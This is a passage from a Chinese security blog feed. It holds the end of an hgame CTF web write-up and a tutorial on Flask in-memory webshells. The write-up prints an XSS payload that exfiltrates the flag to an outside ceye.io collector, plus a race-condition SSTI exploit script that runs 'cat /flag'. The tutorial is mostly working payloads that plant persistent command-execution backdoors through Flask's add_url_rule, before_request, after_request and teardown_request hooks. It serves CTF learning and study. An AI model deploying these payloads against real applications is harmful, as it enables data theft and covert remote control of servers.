class="string">&quot;只有admin才可以访问哦&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Admin accessed the flag&quot;</span>)</span><br><span class="line">c.String(http.StatusOK, flag)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/login&quot;</span>, loginHandler)</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, loginHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/logout&quot;</span>, logoutHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, indexHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, adminHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/flag&quot;</span>, flagHandler)</span><br><span class="line">log.Println(<span class="string">&quot;Server started at :8888&quot;</span>)</span><br><span class="line">log.Fatal(r.Run(<span class="string">&quot;:8888&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较简单的XSS，大概的逻辑就是通过<code>/login</code>路由登录，然后<code>/</code>存在留言板用于我们写入<strong>XSS payload</strong>，而访问<code>/admin</code>路由会触发无头浏览器以admin身份登录，并访问首页。这时候首页加载所有评论，其中包含我们的<strong>XSS payload</strong>，从而以admin身份<strong>访问<code>/flag</code>路由</strong>并将返回的<strong>flag</strong>外带到我们的服务器。</p><p>账户给了<strong>shallot</strong>，通过<strong>弱口令</strong>爆破出密码为<strong>888888</strong>：</p><p><img src="/archives/39f46bd6/QQ20250207-203048.png"></p><p>在留言板写入我们的<strong>XSS payload</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">flag</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://ip.port.4xmzfl.ceye.io/&#x27;</span> + <span class="built_in">encodeURIComponent</span>(flag));</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里我是将flag外带到**<code>CEYE</code>**</p><p><img src="/archives/39f46bd6/QQ20250207-204223.png"></p><p>访问**<code>/admin</code>路由**触发我们的payload，成功外带出flag:</p><p><img src="/archives/39f46bd6/QQ20250207-202957.png"></p><h2 id="角落"><a href="#角落" class="headerlink" title="角落"></a>角落</h2><p>扫目录存在<code>/robots.txt</code>：</p><p><img src="/archives/39f46bd6/QQ20250207-211003.png"></p><p><code>/app.conf</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Include by httpd.conf</span><br><span class="line">&lt;Directory &quot;/usr/local/apache2/app&quot;&gt;</span><br><span class="line">Options Indexes</span><br><span class="line">AllowOverride None</span><br><span class="line">Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;/usr/local/apache2/app/app.py&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;</span><br><span class="line"></span><br><span class="line">ProxyPass &quot;/app/&quot; &quot;http://127.0.0.1:5000/&quot;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">Black Hat USA 2024：利用Apache HTTP服务器中隐藏的语义歧义进行攻击！ | 长亭百川云</a></p><p><img src="/archives/39f46bd6/QQ20250217-173209.png"></p><p>源码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">message = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">return</span> message</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">status = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(message) </span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line"><span class="keyword">return</span> render_template_string(show)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>可以看到存在<strong>SSTI</strong>，但过滤了”{“，直接条件竞争即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://node1.hgame.vidar.club:31112/app&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">race_write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        requests.post(target + <span class="string">&#x27;/send&#x27;</span>,</span><br><span class="line">                      data=&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.get(target + <span class="string">&#x27;/read&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hgame&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 启动竞争写入线程</span></span><br><span class="line">    threading.Thread(target=race_write, daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动检测线程</span></span><br><span class="line">    threading.Thread(target=exploit, daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/archives/39f46bd6/"><img src="/archives/39f46bd6/QQ20250223-132808.png" alt="QQ20250223-132808"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> wp </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> hgame </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python flask内存马学习</title>
      <link href="/archives/31b95644/"/>
      <url>/archives/31b95644/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>内存马</strong>，也被称为<strong>无文件马</strong>，是无文件攻击的一种常用手段。</p><p>常用的python框架有<code>Django</code>、<code>flask</code>，而这两种框架都可能存在SSTI漏洞<strong>。<code>python 内存马</code><strong>就是利用flask框架中</strong>SSTI</strong>或者<strong>pickle反序列化</strong>来实现的，通过添加新的路由访问该路由实现命令执行。</p><h1 id="请求上下文管理机制"><a href="#请求上下文管理机制" class="headerlink" title="请求上下文管理机制"></a>请求上下文管理机制</h1><p>当网页请求进入flask时，会实例化一个<code>requset context</code>.在python中分出了两种上下文：<strong>请求上下文(request context)、应用上下文(session context).<strong>一个请求上下文中封装了请求的信息，而上下文的结构是运用了一个stack的栈结构，也就是说它拥有一个栈所拥有的全部特性</strong>。<code>request context</code>实例化后会被push到栈<code>_request_ctx_stack</code>中，基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</strong> </p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>利用flask编写一个SSTI例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hello, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>原始flask内存马payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>下面我们将Payload拆开来, 逐层分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>前面的<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>中，<code>url_for</code>是flask的一个方法，可以调用<code>__globals__</code>属性，**<code>__globals__</code>能返回函数所在模块命名空间的所有变量<strong>，其中包括很多已经引用的模块，而这里是有<code>__builtins__</code>的，而</strong><code>__builtins__</code>中包含很多内建函数**，其中包括命令执行函数<code>eval()</code>。即这一步主要是为了获取命令执行函数<code>eval()</code>，当然采用SSTI其他payload获取该函数也是可以的</p><p>而后面的<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())</code>用于动态注册一个新的路由规则。</p><p>在flask中我们通常使用**<code>@app.route()</code><strong>装饰器来添加路由，而其也是调用了<code>add_url_rule</code>函数来添加路由的。</strong><code>app.add_url_rule</code>** 提供了更为底层和灵活的方式来定义路由，尤其适合在动态或程序化场景下使用。</p><p><img src="/archives/31b95644/1.png"></p><blockquote><ul><li>rule: 函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头.</li><li>endpoint: 端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.</li><li>view_func: <code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.</li><li>provide_automatic_options: 控制是否应自动添加选项方法.</li><li>options: 要转发到基础规则对象的选项.</li></ul></blockquote><p>而这里<code>&#39;/shell&#39;</code>指路由的路径。<code>shell</code>是路由规则的名称，它是这个路由的标识符，可以在其他地方引用。**<code>lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</code><strong>则是该路由对应的函数，这里定义的一个匿名函数<code>lambda</code>，用于执行命令，</strong>通过<code>_request_ctx_stack.top</code>指向请求上下文栈的顶部元素，即当前正在处理的请求，再通过<code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>获取请求中cmd参数的值，默认为<code>whoami</code>，通过<code>read()</code>标准输出，从而达到添加路由做到任意命令执行**</p><p>再来看看<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>这一截<code>Payload</code>。 <strong><code>_request_ctx_stack</code><strong>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>。</strong><code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</strong>这里指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到。</p><blockquote><p>这里app的获取也可以通过**<code>sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())</code>**</p></blockquote><h1 id="add-url-rule的局限"><a href="#add-url-rule的局限" class="headerlink" title="add_url_rule的局限"></a>add_url_rule的局限</h1><p>上面的payload只针对旧版，但由于新版关闭debug模式会调用check函数，即<code>_check_setup_finished()</code>函数引起报错</p><p><img src="/archives/31b95644/2.png" alt="2"></p><p>意思就是这个app已经跑起来了,这个函数就不能再被调用了.调试之后发现这个方法的<code>@setupmethod</code>装饰器会先check一次,所以基本上是完全不能用了.</p><p>所以旧版不能用的大致原因是因为在可以动态添加路由和错误处理逻辑(如<code>register_error_handler()</code>方法)都被**<code>@setupmethod</code>装饰器修饰<strong>了,而<code>@setupmethod</code>装饰器会在Flask跑起来之前就把这些方法都加到一个被check的名单里,以后</strong>再被调用的话就会被<code>@setupmethod</code>这个装饰器给check然后报错**</p><p>所以add_url_rule就不能用了，这里就需要其他方法挂内存🐎</p><h1 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h1><p><strong>python装饰器：装饰器本质上是一个可调用的对象(函数或类), 它接收一个函数或类座位参数,并返回一个新的函数或类.这个新的函数或类通常会保留原始函数或类的功能,但会在其基础上添加一些额外的逻辑.</strong></p><p>在flask中，**<code>before_request</code>是一个装饰器，它用于在请求处理之前执行特定的函数**。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p><p>举个例子：<br><img src="/archives/31b95644/3.png"></p><p>这里验证请求头是否包含<code>Authorization</code>字段，如果没有，则返回未授权的错误响应(401)</p><p><img src="/archives/31b95644/4.png"></p><p>可以看到<code>before_request</code>实际上调用的是**<code>self.before_request_funcs.setdefault(None, []).append(f)</code>**，其意思是：</p><ul><li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li><li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li><li><strong>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</strong></li></ul><p>这个函数f就是我们要添加的函数。</p><p>而该函数就添加之前payload的lambda匿名函数即可</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].before_request_funcs.setdefault(<span class="literal">None</span>,[]).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><h1 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h1><p><code>after_request</code>与<code>before_request</code>类似。<code>after_request</code>方法允许我们在每个请求之后执行一些操作。我们可以利用该方法来添加一些响应头、记录请求日志等任务</p><p><img src="/archives/31b95644/5.png"></p><p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接收一个response对象，同时返回一个response对象。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp: CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span> <span class="built_in">exec</span>(<span class="string">&#x27;global r;r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(&#x27;</span>cmd<span class="string">&#x27;)).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure><p>逐行解释这段代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> resp: <span class="comment">#传入参数</span></span><br><span class="line">    CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#如果请求参数含有cmd则返回命令执行结果</span></span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        global r;     #定义一个全局变量,方便获取</span></span><br><span class="line"><span class="string">        r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span></span><br><span class="line"><span class="string">    &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#恒真</span></span><br><span class="line">    <span class="keyword">else</span> resp)  <span class="comment">#如果请求参数没有cmd则正常返回</span></span><br><span class="line"><span class="comment">#这里的cmd参数名和r变量名都是可以改的</span></span><br></pre></td></tr></table></figure><p>不带出回显，适用于过滤严格的场景：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> x:<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)))</span><br></pre></td></tr></table></figure><h1 id="Flask中的其他钩子函数"><a href="#Flask中的其他钩子函数" class="headerlink" title="Flask中的其他钩子函数"></a>Flask中的其他钩子函数</h1><p>其实<code>after_request()</code>和<code>before_request()</code>有一个共同的分类叫钩子函数.钩子函数是指在执行函数和目标函数之间挂载的函数,框架开发者给调用方提供一个point-挂载点,至于挂载什么函数由调用方决定.</p><p><strong>@before_first_request</strong></p><p>在对应用程序实例的第一个请求之前注册要运行的函数,只会运行一次.</p><p><strong>@before_request</strong></p><p>在每个请求之前注册一个要运行的函数,每一次请求都会执行一次.</p><p><strong>@after_request</strong></p><p>在每个请求之后注册一个要运行的函数,每次请求完成后都会执行.需要接收一个 Response 对象作为参数,并返回一个新的 Response 对象,或者返回接收的 Response 对象.</p><p><strong>@teardown_request</strong></p><p>注册在每一个请求的末尾,不管是否有异常,每次请求的最后都会执行.</p><p><strong>@context_processor</strong></p><p>上下文处理器,返回的字典可以在全部的模板中使用.</p><p><strong>@template_filter(‘upper’)</strong></p><p>增加模板过滤器,可以在模板中使用该函数,后面的参数是名称,在模板中用到.</p><p><strong>@errorhandler(400)</strong></p><p>发生一些异常时,比如404,500,或者抛出异常(Exception)之类的,就会自动调用该钩子函数.</p><p>1.发生请求错误时,框架会自动调用相应的钩子函数,并向钩子函数中传入error参数.</p><p>2.如果钩子函数没有定义error参数,就会报错.</p><p>3.可以使用<code>abort(http status code)</code>函数来手动终止请求抛出异常,如果要是发生参数错误,可以abort(404)之类的.</p><p><strong>@teardown_appcontext</strong></p><p>不管是否有异常,注册的函数都会在每次请求之后执行.flask 为上下文提供了一个<code>teardown_appcontext</code>钩子,使用它注册的毁掉函数会在程序上下文被销毁时调用,通常也在请求上下文被销毁时调用.某些情况下这个函数和**@teardown_request**的行为是类似的,一个是请求上下文被销毁时被调用,另一个是应用上下文被销毁时调用.</p><p>比如你需要在每个请求处理结束后销毁数据库连接：app.teardown_appcontext 装饰器注册的回调函数需要接收异常对象作为参数,当请求被正常处理时这个参数将是None,这个函数的返回值将被忽略.</p><h2 id="before-request-after-request和-teardown-request-teardown-appcontext的区别"><a href="#before-request-after-request和-teardown-request-teardown-appcontext的区别" class="headerlink" title="@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别"></a>@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别</h2><p><strong>@after_request</strong>是在视图函数处理完请求并生成响应对象之后，但在响应被发送给客户端之前。而且这个函数需要接收当前的响应作为参数,并可以返回一个新的响应对象或者返回原来的响应对象.</p><p><strong>@teardown_request&#x2F;@teardown_appcontext</strong>无论请求是否成功完成，无论是否发生了异常,是在响应已经被发送给客户端之后被触发,而且不接受任何参数.</p><p><strong>@after_request</strong>装饰的函数如果抛出了异常就会直接跳转到错误处理机制.</p><p><strong>@teardown_request&#x2F;@teardown_appcontext</strong>装饰的函数被抛出的异常通常会被忽略.</p><h2 id="teardown-request的利用"><a href="#teardown-request的利用" class="headerlink" title="@teardown_request的利用"></a>@teardown_request的利用</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>**不能调用<code>request.args.get()</code>动态执行传入的命令,**但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.在这个时候上一个HTTP请求帧已经被销毁了,但是可以执行静态命令.</p><h2 